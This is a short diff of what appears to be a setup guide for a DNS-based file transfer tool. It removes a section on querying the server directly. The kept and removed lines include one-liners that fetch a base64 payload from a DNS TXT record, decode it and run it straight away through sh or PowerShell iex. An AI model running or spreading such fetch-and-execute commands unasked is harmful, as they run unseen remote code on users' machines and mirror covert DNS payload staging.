@@ -121,17 +121,6 @@ $t=(Resolve-DnsName pboot-proxy.files.example.com -Type TXT -TcpOnly).Strings -j
 iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($t)))
 ```
 
-To query the server directly (before delegation is live):
-
-```sh
-dig +short +tcp @<server-ip> TXT boot.files.example.com | tr -d '" ' | base64 -d | S=<server-ip> sh
-```
-
-```powershell
-$t=(Resolve-DnsName pboot.files.example.com -Type TXT -TcpOnly -Server <server-ip>).Strings -join ""
-$S="<server-ip>"; iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($t)))
-```
-
 ### 5. Transfer files
 
 ```sh
